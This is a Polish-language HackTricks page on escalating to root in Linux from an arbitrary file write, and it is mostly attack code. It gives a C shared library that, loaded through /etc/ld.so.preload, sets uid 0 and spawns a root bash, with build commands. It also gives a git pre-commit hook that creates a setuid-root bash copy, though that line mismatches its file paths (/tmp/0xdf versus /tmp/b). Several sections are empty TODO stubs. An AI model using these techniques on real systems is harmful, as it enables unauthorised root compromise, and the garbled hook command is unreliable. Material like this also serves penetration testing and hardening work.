# Pisanie dowolnego pliku do roota

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.

</details>

### /etc/ld.so.preload

Ten plik zachowuje się jak zmienna środowiskowa **`LD_PRELOAD`**, ale działa również w **binariach SUID**.\
Jeśli możesz go utworzyć lub zmodyfikować, po prostu dodaj **ścieżkę do biblioteki, która będzie ładowana** przy każdym uruchomionym binarnym pliku.

Na przykład: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Haki Git

[Haki Git](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) to **skrypty**, które są **uruchamiane** podczas różnych **zdarzeń** w repozytorium git, na przykład podczas tworzenia commita, łączenia... Jeśli **uprzywilejowany skrypt lub użytkownik** wykonuje te czynności często i jest możliwe **zapisywanie w folderze `.git`**, można to wykorzystać do **privesc**.

Na przykład, można **wygenerować skrypt** w repozytorium git w **`.git/hooks`**, aby zawsze był wykonywany podczas tworzenia nowego commita:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Pliki Cron & Time

TODO

### Pliki Usługi & Gniazda

TODO

### binfmt\_misc

Plik znajdujący się w `/proc/sys/fs/binfmt_misc` wskazuje, który plik binarny powinien wykonać jaki rodzaj plików. TODO: sprawdź wymagania, aby wykorzystać to do wykonania powłoki rev, gdy otwarty jest powszechny typ pliku.
